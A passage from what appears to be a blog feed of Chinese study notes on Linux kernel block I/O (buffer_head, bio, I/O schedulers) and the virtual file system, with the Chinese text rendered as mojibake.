‡å¿—</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td>BH_Uptodate</td><td>è¯¥ç¼“å†²åŒºåŒ…å«å¯ç”¨æ•°æ®</td></tr><tr><td>BH_Dirty</td><td>ç¼“å†²åŒºè„ï¼ˆå†…å­˜ç£ç›˜ä¸ä¸€è‡´ï¼Œéœ€è¦æ›´æ–°ç£ç›˜ï¼‰</td></tr><tr><td>BH_Delay</td><td>ç¼“å†²åŒºå°šæœªäºç£ç›˜å—å…³è”</td></tr><tr><td>BH_Boundary</td><td>å¤„äºè¿ç»­å—åŒºçš„è¾¹ç•Œï¼Œä¸‹ä¸ªå—ä¸å†è¿ç»­</td></tr><tr><td>BH_Quiet</td><td>ç¼“å†²åŒºç¦æ­¢é”™è¯¯</td></tr><tr><td>BH_Unwritten</td><td>ç¼“å†²åŒºåœ¨ç¡¬ç›˜ä¸Šç©ºé—´è¢«ç”³è¯·ï¼Œä½†æ²¡æœ‰å®é™…æ•°æ®å†™å‡º</td></tr></tbody></table><p>ç‰¹æ®Šä½ï¼šBH_PrivateStartï¼ŒæŒ‡æ˜å¯è¢«å…¶ä»–ä»£ç ä½¿ç”¨çš„èµ·å§‹ä½</p><p>å—IOä¸ä¼šä½¿ç”¨BH_PrivateStartæˆ–æ›´é«˜çš„ä½</p><p>å¦‚æœé©±åŠ¨å¸Œæœ›b_stateåŸŸå­˜å‚¨ä¿¡æ¯ï¼Œå°±å¯ä»¥å®‰å…¨ä½¿ç”¨è¿™äº›ä½ã€‚åªè¦ä¸ä¸ä½¿ç”¨å†²çª</p><p>b_countè¡¨ç¤ºç¼“å†²åŒºçš„ä½¿ç”¨è®°æ•°ï¼Œæ“ä½œç¼“å†²åŒºå¤´å‰ï¼Œå…ˆç”¨get_bh()å‡½æ•°å¢åŠ ç¼“å†²åŒºå¤´å¼•ç”¨è®¡æ•°ï¼Œç¡®ä¿å…¶ä¸ä¼šå†è¢«åˆ†é…å‡ºå»</p><p>å¯¹åº”çš„ç‰©ç†å—ç”±b_blocknr.thåŸŸç´¢å¼•ï¼Œé€»è¾‘å—å·</p><p>å—åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ä½b_page-&gt;b_dataï¼Œç»“æŸä¸º(b_data+b_size)å¤„</p><p><strong>2.6å†…æ ¸å‰</strong>ï¼Œç¼“å†²åŒºå¤´çš„ä½œç”¨æ›´é‡è¦ï¼šä¸ä»…æè¿°æ˜ å°„ï¼Œè¿˜æ˜¯æ‰€æœ‰å—IOæ“ä½œçš„å®¹å™¨</p><p>è¿™æ ·çš„å¼Šç«¯ï¼š</p><ul><li>ç¼“å†²åŒºå¤´å¾ˆå¤§ï¼ˆç°åœ¨ç¼©å‡ï¼‰</li><li>æ•°æ®å»å·å¯¹æ•°æ®çš„æ“ä½œä¸æ–¹ä¾¿ï¼Œä¸æ¸…æ™°ï¼Œå†…æ ¸å€¾å‘æ“ä½œé¡µé¢ç»“æ„</li></ul><p><strong>2.6å†…æ ¸å</strong>ï¼Œå†…æ ¸ç›´æ¥å¯¹é¡µé¢ï¼Œåœ°å€ç©ºé—´æ“ä½œï¼Œä¸å†ä½¿ç”¨ç¼“å†²åŒºå¤´ï¼Œå…·ä½“æƒ…å†µè§address_spaceç»“æ„ï¼Œpdflushç­‰å®ˆæŠ¤è¿›ç¨‹(daemon)</p><p>ç¬¬äºŒä¸ªå¼Šç«¯ï¼šä»…èƒ½æè¿°å•ä¸ªç¼“å†²åŒºï¼Œå¯¹äºå¤§å—æ•°æ®IOéœ€è¦åˆ†è§£ä¸ºå¤šä¸ªbuffer_headç»“æ„ä½“ã€‚ä¼šé€ æˆä¸å¿…è¦çš„è´Ÿæ‹…å’Œç©ºé—´æµªè´¹</p><p>2.5å¼•å…¥æ–°å‹ï¼Œçµæ´»ï¼Œè½»é‡çº§çš„å®¹å™¨ï¼Œbioç»“æ„ä½“</p><h2 id="14-3-bioç»“æ„ä½“"><a href="#14-3-bioç»“æ„ä½“" class="headerlink" title="14.3 bioç»“æ„ä½“"></a>14.3 bioç»“æ„ä½“</h2><p>å—IOæ“ä½œçš„åŸºæœ¬å®¹å™¨ç”±bioç»“æ„ä½“è¡¨ç¤ºï¼Œå®šä¹‰åœ¨&lt;linux/bio.h&gt;ä¸­ã€‚</p><p>è¯¥ç»“æ„ä»£è¡¨äº†ç°åœºçš„ï¼ˆæ´»åŠ¨çš„ï¼‰ä»¥ç‰‡æ®µï¼ˆsegmentï¼‰é“¾è¡¨å½¢å¼ç»„ç»‡çš„å—IOæ“ä½œ</p><p>ä¸€ä¸ªç‰‡æ®µæ˜¯ä¸€å°å—è¿ç»­çš„å†…å­˜ç¼“å†²åŒºã€‚è¿™æ ·ä¸éœ€è¦å•ä¸ªç¼“å†²åŒºä¸€å®šè¿ç»­</p><p>å³æ—¶ä¸€ä¸ªç¼“å†²åŒºåˆ†æ•£åœ¨å†…å­˜å¤šä¸ªä½ç½®ï¼Œbioä¹Ÿèƒ½ä¿è¯IOæ‰§è¡Œ</p><p>è¿™æ ·çš„IOå°±æ˜¯èšæ•£IO</p><p>ç»“æ„ä½“å®šä¹‰äº&lt;linux/bio.h&gt;</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> bio<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span>    bi_vcnt<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*bio_vecsåç§»çš„ä¸ªæ•°*/</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span>    bi_idx<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*bio_io_vecçš„å½“å‰ç´¢å¼•*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">struct</span> bio_vec    <span class="token operator">*</span>bi_io_vec<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*bio_vecé“¾è¡¨*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><h3 id="14-3-1-IOå‘é‡"><a href="#14-3-1-IOå‘é‡" class="headerlink" title="14.3.1 IOå‘é‡"></a>14.3.1 IOå‘é‡</h3><p>â€‹    bi_io_vecåŒ…å«ä¸€ä¸ªç‰¹å®šIOæ“ä½œæ‰€è¦çš„æ‰€æœ‰ç‰‡æ®µã€‚æ¯ä¸ªbio_vecéƒ½æ˜¯å½¢å¼ä¸º&lt;page,offset,len&gt;çš„å‘é‡ï¼Œå®šä¹‰äº&lt;linux/bio.h&gt;</p><p>â€‹    å½“IOæ“ä½œæ‰§è¡Œå®Œæ¯•åï¼Œbi_idxæŒ‡å‘æ•°ç»„çš„å½“å‰ç´¢å¼•</p><p>â€‹    bi_idxä¸æ–­æ›´æ–°ï¼ŒæŒ‡å‘å½“å‰ç‰‡æ®µï¼Œæ›´é‡è¦çš„ä½œç”¨åœ¨äºåˆ†å‰²bioç»“æ„ä½“</p><p>â€‹    RAIDå¯ä»¥æŠŠå•ç‹¬çš„bioç»“æ„ä½“åˆ†éš”åˆ°é˜µåˆ—ä¸­çš„å„ä¸ªç¡¬ç›˜ä¸Š</p><p>â€‹    RAIDè®¾å¤‡åªè¦æ‹·è´ç»“æ„ä½“ï¼Œå°†bi_idxæ”¹ä¸ºéœ€è¦çš„ä½ç½®</p><p>â€‹    bi_cntè®°å½•ä½¿ç”¨è®¡æ•°</p><p>â€‹    bi_privateåªç”¨åˆ›å»ºè€…å¯ä»¥è¯»å†™</p><h3 id="14-3-2-æ–°è€æ–¹æ³•å¯¹æ¯”"><a href="#14-3-2-æ–°è€æ–¹æ³•å¯¹æ¯”" class="headerlink" title="14.3.2 æ–°è€æ–¹æ³•å¯¹æ¯”"></a>14.3.2 æ–°è€æ–¹æ³•å¯¹æ¯”</h3><p>bioä»£è¡¨IOæ“ä½œï¼Œå¯ä»¥åŒ…æ‹¬å¤šä¸ªé¡µ</p><p>buffer_headä»£è¡¨ä¸€ä¸ªç¼“å†²åŒºï¼Œæè¿°ç£ç›˜çš„ä¸€ä¸ªå—</p><p>bioçš„å¥½å¤„ï¼š</p><ul><li>å®¹æ˜“å¤„ç†é«˜ç«¯å†…å­˜ï¼Œå¤„ç†é¡µé¢è€Œä¸æ˜¯æŒ‡é’ˆ(page,offset,len)</li><li>è¯¾ä»£è¡¨æ™®é€šé¡µIOï¼Œä¹Ÿå¯ä»£è¡¨ç›´æ¥IO</li></ul><p>å†…æ ¸å°†ä¸¤ç§ç»“æ„å°½é‡ç‹¬ç«‹ï¼Œä½¿å¾—ä¿¡æ¯å°½å¯èƒ½å°‘</p><h2 id="14-4-è¯·æ±‚é˜Ÿåˆ—"><a href="#14-4-è¯·æ±‚é˜Ÿåˆ—" class="headerlink" title="14.4 è¯·æ±‚é˜Ÿåˆ—"></a>14.4 è¯·æ±‚é˜Ÿåˆ—</h2><p>æŒ‚èµ·çš„å—IOä¿å­˜åœ¨è¯·æ±‚é˜Ÿåˆ—ï¼Œç”±reques_queueç»“æ„ä½“è¡¨ç¤º</p><p>å®šä¹‰åœ¨&lt;linux/blkdev,h&gt;,ä¸€ä¸ªåŒå‘è¯·æ±‚é“¾è¡¨å’Œç›¸å…³æ§åˆ¶ä¿¡æ¯</p><p>åˆ—è¡¨ä¸­æ¯ä¸€é¡¹éƒ½æ˜¯å•ç‹¬è¯·æ±‚</p><p>è¯·æ±‚ç”±ç»“æ„ä½“requestè¡¨ç¤ºï¼Œå®šä¹‰åœ¨&lt;linux/blkdev,h&gt;</p><p>ä¸€ä¸ªè¯·æ±‚å¯èƒ½è¦æ“ä½œå¤šä¸ªè¿ç»­ç£ç›˜å—ï¼Œæ¯ä¸ªè¯·æ±‚å¯ç”±å¤šä¸ªbioç»„æˆ</p><h2 id="14-5-IOè°ƒåº¦ç¨‹åº"><a href="#14-5-IOè°ƒåº¦ç¨‹åº" class="headerlink" title="14.5 IOè°ƒåº¦ç¨‹åº"></a>14.5 IOè°ƒåº¦ç¨‹åº</h2><p>ç¼©çŸ­å¯»å€æ—¶é—´æ˜¯æé«˜æ€§èƒ½å…³é”®</p><p>é¢„æäº¤æ“ä½œå‰ï¼Œæ‰§è¡Œåä¸ºåˆå¹¶ä¸æ’åºçš„é¢„æ“ä½œ</p><h3 id="14-5-1-IOè°ƒåº¦ç¨‹åºçš„å·¥ä½œ"><a href="#14-5-1-IOè°ƒåº¦ç¨‹åºçš„å·¥ä½œ" class="headerlink" title="14.5.1 IOè°ƒåº¦ç¨‹åºçš„å·¥ä½œ"></a>14.5.1 IOè°ƒåº¦ç¨‹åºçš„å·¥ä½œ</h3><p>ä¸¤ç§æ“ä½œï¼šåˆå¹¶ä¸æ’åº </p><h4 id="åˆå¹¶"><a href="#åˆå¹¶" class="headerlink" title="åˆå¹¶"></a>åˆå¹¶</h4><p>å½“è®¿é—®çš„æ‰‡åŒºä¸å½“å‰è¯·æ±‚è®¿é—®çš„æ‰‡åŒºå“é“ƒï¼Œå¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ª</p><p>å¤šä¸ªå‹ç¼©ä¸ºä¸€ä¸ª</p><p>æ’åºç®—æ³•ï¼šå°†æ‰‡åŒºé¡ºåºæœ‰åºæ’åˆ—ï¼Œç”µæ¢¯è°ƒåº¦</p><h3 id="14-5-2-linusç”µæ¢¯"><a href="#14-5-2-linusç”µæ¢¯" class="headerlink" title="14.5.2 linusç”µæ¢¯"></a>14.5.2 linusç”µæ¢¯</h3><p>2.4é‡‡ç”¨ï¼Œ2.6è¢«å…¶ä»–ä¸¤ç§è°ƒåº¦ç¨‹åºå–ä»£</p><p>æ‰§è¡Œå‘å‰å’Œå‘ååˆå¹¶</p><p>åˆå¹¶å¤±è´¥ï¼Œå¯»æ‰¾å¯èƒ½çš„æ’å…¥ç‚¹</p><p>ä¸€ä¸ªè¯·æ±‚åŠ å…¥åˆ°é˜Ÿåˆ—æ—¶ï¼Œä¼šå‘ç”Ÿå››ç§æ“ä½œï¼š</p><ol><li>å­˜åœ¨ç›¸é‚»è¯·æ±‚ï¼Œåˆå¹¶</li><li>é©»ç•™æ—¶é—´è¿‡é•¿çš„è¯·æ±‚ï¼Œæ–°è¯·æ±‚æ’å…¥é˜Ÿå°¾</li><li>å­˜åœ¨ä»¥æ‰‡åŒºæ–¹å‘ä¸ºåºçš„åˆé€‚ä½ç½®ï¼Œæ’å…¥åˆ°è¯¥ä½ç½®</li><li>ä¸å­˜åœ¨åˆé€‚ä½ç½®ï¼Œæ’å…¥é˜Ÿå°¾</li></ol><h3 id="14-5-3-æœ€ç»ˆæœŸé™IOè°ƒåº¦"><a href="#14-5-3-æœ€ç»ˆæœŸé™IOè°ƒåº¦" class="headerlink" title="14.5.3 æœ€ç»ˆæœŸé™IOè°ƒåº¦"></a>14.5.3 æœ€ç»ˆæœŸé™IOè°ƒåº¦</h3><p>deadlineï¼šè§£å†³é¥¥é¥¿é—®é¢˜</p><p>æ™®é€šçš„é¥¥é¥¿è¯·æ±‚è¿˜ä¼šå¸¦æ¥å†™-é¥¥é¥¿-è¯»çš„é—®é¢˜</p><p>å†™æ“ä½œï¼šå†…æ ¸æœ‰ç©ºæ‰ç»™ç£ç›˜ï¼Œå’Œæäº¤çš„ç¨‹åºå¼‚æ­¥æ‰§è¡Œ</p><p>è¯»æ“ä½œï¼šå’Œæäº¤çš„ç¨‹åºåŒæ­¥æ‰§è¡Œ</p><p>è¯»è¯·æ±‚å¯èƒ½ä¼šäº’ç›¸ä¾é </p><p>å¦‚ä½•å¹³è¡¡å‡å°‘è¯·æ±‚é¥¥é¥¿å’Œä¿è¯ååé‡ï¼Œæ˜¯å›°éš¾çš„é—®é¢˜</p><p>deadline:è¯»500msï¼Œå†™5s</p><p>æ–°è¯·æ±‚æäº¤æ—¶ï¼Œç±»ä¼¼linusç”µæ¢¯</p><p>ä¹Ÿä¼šæŒ‰ç±»å‹æ’å…¥åˆ°é¢å¤–é˜Ÿåˆ—</p><p>è‹¥å†™FIFOï¼Œè¯»FIFOè¶…æ—¶ï¼Œä»ä»–ä»¬ä¸­å–å‡ºè¯·æ±‚</p><p>ä¿è¯äº†è¯»è¯·æ±‚è¿…é€Ÿå®Œæˆ</p><p>è°ƒåº¦ç¨‹åºåœ¨æ–‡ä»¶block/deadline-ioshed.cä¸­</p><h3 id="14-5-4-é¢„æµ‹IOè°ƒåº¦ç¨‹åº"><a href="#14-5-4-é¢„æµ‹IOè°ƒåº¦ç¨‹åº" class="headerlink" title="14.5.4 é¢„æµ‹IOè°ƒåº¦ç¨‹åº"></a>14.5.4 é¢„æµ‹IOè°ƒåº¦ç¨‹åº</h3><p>deadlineä¸è¶³ï¼šå…ˆè¯»å®šä½ï¼Œå†å†™å®šä½ï¼ŒæŸå®³äº†å…¨å±€ååé‡</p><p>é¢„æµ‹IOï¼šå¢åŠ äº†é¢„æµ‹å¯å‘åŠŸèƒ½anticipation-heuristic</p><p>è¯•å›¾åœ¨è¿›è¡ŒIOæ“ä½œæœŸé—´ï¼Œå¤„ç†æ–°åˆ°çš„è¯»è¯·æ±‚å¸¦æ¥çš„å¯»å€æ•°é‡</p><p>ä¸åŒä¹‹å¤„åœ¨äºï¼Œæäº¤è¯·æ±‚åï¼Œä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯æœ‰æ„ç©ºé—²ç‰‡åˆ»</p><p>ç”¨äºæäº¤å…¶å®ƒè¯»è¯·æ±‚ï¼Œä»»ä½•ç›¸é‚»æ“ä½œçš„è¯·æ±‚ä¼šå¾—åˆ°å¤„ç†</p><p>ç­‰å¾…æ—¶é—´ç»“æŸåï¼Œé¢„æµ‹ç¨‹åºé‡æ–°è¿”å›åŸæ¥ä½ç½®ï¼Œå¤„ç†å…¶å®ƒè¯·æ±‚</p><p><strong>å¦‚æœå­˜åœ¨è¶Šæ¥è¶Šå¤šçš„åŒåŒºåŸŸè¯»è¯·æ±‚ï¼Œå¯ä»¥é¿å…å¤§é‡çš„å¯»å€æ“ä½œ</strong></p><p>ä¼˜åŠ¿å–å†³äºèƒ½å¦æ­£ç¡®é¢„æµ‹åº”ç”¨ç¨‹åºçš„å½¢ä¸º</p><p>å®ç°åœ¨block/as-ioshed.cä¸­</p><h3 id="14-5-5-å®Œå…¨å…¬æ­£çš„æ’é˜ŸIOè°ƒåº¦"><a href="#14-5-5-å®Œå…¨å…¬æ­£çš„æ’é˜ŸIOè°ƒåº¦" class="headerlink" title="14.5.5 å®Œå…¨å…¬æ­£çš„æ’é˜ŸIOè°ƒåº¦"></a>14.5.5 å®Œå…¨å…¬æ­£çš„æ’é˜ŸIOè°ƒåº¦</h3><p>complete fair queuing</p><p>æ ¹æ®è¿›ç¨‹ç»„ç»‡ï¼šfooè¿›ç¨‹æ”¾å…¥fooé˜Ÿåˆ—ï¼Œbarè¿›ç¨‹æ”¾å…¥baré˜Ÿåˆ—</p><p>æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ï¼Œæ¯ä¸ªé˜Ÿåˆ—é€‰å–è¯·æ±‚æ•°ï¼ˆé»˜è®¤ä¸º4ï¼‰ï¼Œç¨‹åºä½äºblock/cfq-iosched.c</p><h3 id="14-5-6-ç©ºæ“ä½œçš„IOè°ƒåº¦"><a href="#14-5-6-ç©ºæ“ä½œçš„IOè°ƒåº¦" class="headerlink" title="14.5.6 ç©ºæ“ä½œçš„IOè°ƒåº¦"></a>14.5.6 ç©ºæ“ä½œçš„IOè°ƒåº¦</h3><p>åªæ‰§è¡Œåˆå¹¶</p><p>ä¸å‹¤å¥‹å·¥ä½œçš„åŸå› ï¼šçœŸæ­£çš„éšæœºè®¿é—®è®¾å¤‡ï¼Œå¦‚é—ªå­˜å¡ï¼Œæ²¡æœ‰å¯»é“çš„è´Ÿæ‹…ï¼Œæ²¡å¿…è¦æ’å…¥æ’åº</p><p>ä½äºblock/noop-ioshed.c</p><h3 id="14-5-7-IOè°ƒåº¦ç¨‹åºçš„é€‰æ‹©"><a href="#14-5-7-IOè°ƒåº¦ç¨‹åºçš„é€‰æ‹©" class="headerlink" title="14.5.7 IOè°ƒåº¦ç¨‹åºçš„é€‰æ‹©"></a>14.5.7 IOè°ƒåº¦ç¨‹åºçš„é€‰æ‹©</h3><p>é€šè¿‡elevator=fooè¦†ç›–ç¼ºçœï¼ˆas,cfq,deadline,noop)ï¼Œé»˜è®¤cfq</p><h2 id="14-6-å°ç»“"><a href="#14-6-å°ç»“" class="headerlink" title="14.6 å°ç»“"></a>14.6 å°ç»“</h2><p>æ•°æ®ç»“æ„(bio,buffer_head)+4ç§è°ƒåº¦ç®—æ³•</p>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023930</title>
      <link href="/2023/09/30/2023-9-30/"/>
      <url>/2023/09/30/2023-9-30/</url>
      
        <content type="html"><![CDATA[<h1 id="è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"><a href="#è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"></a>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h1><p>VFSä½œä¸ºå†…æ ¸çš„å­ç³»ç»Ÿ</p><p>æ‰€æœ‰FSä¸ä½†ä»¥æ¥VFSå…±å­˜ï¼Œä¹Ÿä¾é VFSååŒå·¥ä½œ</p><p>ä¸åŒFSï¼Œç”šè‡³ä¸åŒä»‹è´¨çš„FSå¯è¿›è¡Œè¯»å†™å·¥ä½œ</p><h2 id="13-1-é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¥å£"><a href="#13-1-é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¥å£" class="headerlink" title="13.1 é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¥å£"></a>13.1 é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¥å£</h2><h2 id="13-2-æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚"><a href="#13-2-æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚" class="headerlink" title="13.2 æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚"></a>13.2 æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚</h2><p>é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¨¡å‹ï¼šå›Šæ‹¬äº†ä»»ä½•æ–‡ä»¶ç³»ç»Ÿçš„å¸¸ç”¨åŠŸèƒ½é›†</p><p>å¯æ”¯æŒå¤šç§å·®å¼‚å¾ˆå¤§çš„FSï¼Œä»DOSç³»ç»Ÿçš„FATåˆ°windowsçš„NTFS</p><p>ä¸€æ–¹é¢ï¼Œç³»ç»Ÿè°ƒç”¨æ—¶é€šç”¨VFSæ¥å£ï¼Œæä¾›ç»™ç”¨æˆ·ç©ºé—´çš„å‰ç«¯</p><p>å¦ä¸€æ–¹é¢ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯å…·ä½“æ–‡ä»¶ç³»ç»Ÿçš„åç«¯</p><p>userspace -&gt; VFS -&gt; FS -&gt; ç‰©ç†ä»‹è´¨</p><h3 id="13-3-Unixæ–‡ä»¶ç³»ç»Ÿ"><a href="#13-3-Unixæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="13.3 Unixæ–‡ä»¶ç³»ç»Ÿ"></a>13.3 Unixæ–‡ä»¶ç³»ç»Ÿ</h3><p>éunixé£æ ¼çš„FSï¼Œå¿…é¡»ç»è¿‡å°è£…ï¼Œå¾—åˆ°ç¬¦åˆunixæ¦‚å¿µçš„æ¥å£ï¼ˆæ–‡ä»¶ï¼Œç›®å½•é¡¹ï¼Œinodeï¼ŒæŒ‚è½½ç‚¹ï¼‰</p><h3 id="13-4-VFSå¯¹è±¡åŠå…¶æ•°æ®ç»“æ„"><a href="#13-4-VFSå¯¹è±¡åŠå…¶æ•°æ®ç»“æ„" class="headerlink" title="13.4 VFSå¯¹è±¡åŠå…¶æ•°æ®ç»“æ„"></a>13.4 VFSå¯¹è±¡åŠå…¶æ•°æ®ç»“æ„</h3><p>VFSçš„ä¸»è¦å¯¹è±¡ï¼š</p><ul><li>è¶…çº§å—ï¼Œä»£è¡¨ä¸€ä¸ªå…·ä½“çš„FS</li><li>ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡ï¼Œä»£è¡¨ä¸€ä¸ªå…·ä½“æ–‡ä»¶</li><li>ç›®å½•é¡¹å¯¹è±¡ï¼Œä»£è¡¨ç›®å½•é¡¹ï¼Œæ˜¯è·¯å¾„çš„ç»„æˆéƒ¨åˆ†ï¼ˆç›®å½•æˆ–æ–‡ä»¶ï¼‰</li><li>æ–‡ä»¶å¯¹è±¡</li></ul><p>æ¯ä¸ªä¸»è¦å¯¹è±¡ï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ï¼Œæè¿°äº†å†…æ ¸å¯¹ä¸»è¦å¯¹è±¡å¯ä»¥ä½¿ç”¨çš„æ–¹æ³•</p><ul><li>super_operationså¯¹è±¡ï¼Œå¯¹æ–‡ä»¶ç³»ç»Ÿï¼Œå¦‚write_inode()å’Œsync_fs()</li><li>inode_operations,create()å’Œlinkï¼ˆï¼‰</li><li>dentry_operations, d_compare() and d_delete()</li><li>file_operations, read() and write()</li></ul><p>æ“ä½œå¯¹è±¡ä½œä¸ºä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆå®ç°ï¼ˆç±»æ¯”IO_FILE)</p><p>é™¤æ­¤ä¹‹å¤–ï¼š</p><ul><li>æ³¨å†Œçš„æ–‡ä»¶ç³»ç»Ÿç”¨file_system_typeç»“æ„ä½“</li><li>å®‰è£…ç‚¹ç”¨vfsmountç»“æ„ä½“</li><li>fs_struct</li><li>file</li></ul><h2 id="13-5-è¶…çº§å—å¯¹è±¡"><a href="#13-5-è¶…çº§å—å¯¹è±¡" class="headerlink" title="13.5 è¶…çº§å—å¯¹è±¡"></a>13.5 è¶…çº§å—å¯¹è±¡</h2><p>é€šå¸¸ä¸ºç£ç›˜è¶…çº§å¿«ï¼›å¯¹äºå†…å­˜æ–‡ä»¶ç³»ç»Ÿï¼Œä¼šç°åœºåˆ›å»ºè¶…çº§å—ä¿å­˜åœ¨å†…å­˜</p><p>super_blockç»“æ„ä½“å®šä¹‰åœ¨æ–‡ä»¶&lt;linux/fs.h&gt;</p><h2 id="13-6-è¶…çº§å¿«æ“ä½œ"><a href="#13-6-è¶…çº§å¿«æ“ä½œ" class="headerlink" title="13.6 è¶…çº§å¿«æ“ä½œ"></a>13.6 è¶…çº§å¿«æ“ä½œ</h2><p>æœ€é‡è¦çš„s_opï¼Œæ“ä½œå‡½æ•°è¡¨ï¼Œå®šä¹‰åœ¨æ–‡ä»¶&lt;linux/fs.h&gt;</p><p>æ–‡ä»¶ç³»ç»Ÿéœ€è¦æ‰§è¡Œè¶…çº§å¿«æ“ä½œæ—¶ï¼Œéœ€è¦åœ¨è¶…çº§å¿«å¯¹è±¡ä¸­ï¼Œæ‰¾éœ€è¦çš„æ“ä½œæ–¹æ³•ï¼Œå¦‚å†™è‡ªå·±çš„è¶…çº§å¿«ï¼š</p><pre><code>sb-&gt;s_op-&gt;write_super(sb);</code></pre><p>sb:super blockæŒ‡é’ˆï¼Œæ‰¾opå†æ‰¾write</p><p>å°½ç®¡å‡½æ•°æ¥è‡ªè¶…çº§å¿«ï¼Œè°ƒç”¨æ—¶è¿˜æ˜¯è¦æŠŠè¶…çº§å¿«ä½œä¸ºå‚æ•°ä¼ é€’</p><p>å¦‚æœc++åªéœ€è¦</p><p>sb.write_super();</p><pre><code>//åˆ›å»ºåˆå§‹åŒ–æ–°çš„ç´¢å¼•èŠ‚ç‚¹struct inode* alloc_inode(struct super_block *sb)//é‡Šæ”¾ç»™å®šçš„ç´¢å¼•èŠ‚ç‚¹void destroy_inode(struct inode* inode)//ç´¢å¼•èŠ‚ç‚¹è„æ—¶è°ƒç”¨ï¼Œæ—¥å¿—æ–‡ä»¶ç³»ç»Ÿæ‰§è¡Œå‡½æ•°ï¼Œæ›´æ–°æ—¥å¿—void dirty_inode(struct inode* inode)//ç´¢å¼•èŠ‚ç‚¹å†™å…¥ç£ç›˜ï¼Œwaitè¡¨ç¤ºå†™æ“ä½œæ˜¯å¦éœ€è¦åŒæ­¥void write_inode(struct inode *inode, int wait)//æœ€åä¸€ä¸ªå¼•ç”¨æ¶ˆå¤±ï¼ŒVFSè°ƒç”¨åˆ é™¤inodevoid drop_inode(struct inode *inode)void delete_inode(struct inode *inode)//å¸è½½æ–‡ä»¶ç³»ç»Ÿæ—¶é‡Šæ”¾è¶…çº§å¿«ï¼Œè°ƒç”¨è€…å¿…é¡»æŒæœ‰s_lockvoid put_super(struct super_block *sb)//ç”¨ç»™å®šçš„è¶…çº§å¿«æ›´æ–°ç£ç›˜çš„è¶…çº§å¿«void write_super(struct super_block *sb)//æ–‡ä»¶ç³»ç»Ÿçš„æ•°æ®å…ƒä¸ç£ç›˜ä¸Šçš„fsåŒæ­¥int sync_fs(struct super_block *sb, int wait)//ç¦æ­¢å¯¹æ–‡ä»¶ç³»ç»Ÿæ”¹å˜ï¼Œå†ç”¨è¶…çº§å¿«æ›´æ–°ç£ç›˜è¶…çº§å¿«ï¼ŒLVM(é€»è¾‘å·æ ‡ç®¡ç†)ä½¿ç”¨void write_super_lockfs(struct super_block *sb)//é‡æ–°å®‰è£…æ–‡ä»¶ç³»ç»Ÿint remount_fs(struct super_block *sb,int *flag, char* data)//é‡Šæ”¾inode+æ¸…ç©ºvoid clear_inode(struct inode *inode)//ä¸­æ–­å®‰è£…æ“ä½œ,ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿå¦‚NFSä½¿ç”¨void umount_begin(struct super_block *sb)</code></pre><p>é™¤äº†dirty_inodeéƒ½å¯ä»¥é˜»å¡</p><p>å¦‚æœæ“ä½œå‡½æ•°æŒ‡é’ˆä¸ºNULLï¼Œè°ƒç”¨é€šç”¨å‡½æ•°æ‰§è¡Œæ“ä½œ</p><h2 id="13-7-ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡"><a href="#13-7-ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡" class="headerlink" title="13.7 ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡"></a>13.7 ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡</h2><p>ç´¢å¼•èŠ‚ç‚¹ï¼šå†…æ ¸æ“ä½œæ–‡ä»¶æˆ–ç›®å½•æ—¶éœ€è¦çš„å…¨éƒ¨ä¿¡æ¯</p><p>Unixé£æ ¼FSç›´æ¥è¯»å–</p><p>å…¶å®ƒéœ€è¦æå–inodeç›¸å…³ä¿¡æ¯</p><h2 id="13-8-ç´¢å¼•èŠ‚ç‚¹æ“ä½œ"><a href="#13-8-ç´¢å¼•èŠ‚ç‚¹æ“ä½œ" class="headerlink" title="13.8 ç´¢å¼•èŠ‚ç‚¹æ“ä½œ"></a>13.8 ç´¢å¼•èŠ‚ç‚¹æ“ä½œ</h2><p>è°ƒç”¨æ–¹å¼</p><pre><code>i-&gt;i_op-&gt;truncate(i)</code></pre><p>è¿™äº›å‡½æ•°å¯èƒ½VFSæ‰§è¡Œï¼Œä¹Ÿå¯èƒ½å…·ä½“æ–‡ä»¶ç³»ç»Ÿæ‰§è¡Œ</p><pre><code>//ä¸ºdentryåˆ›å»ºæ–°çš„ç´¢å¼•èŠ‚ç‚¹ï¼Œmodeè®¾ç½®åˆå§‹æ¨¡å¼int 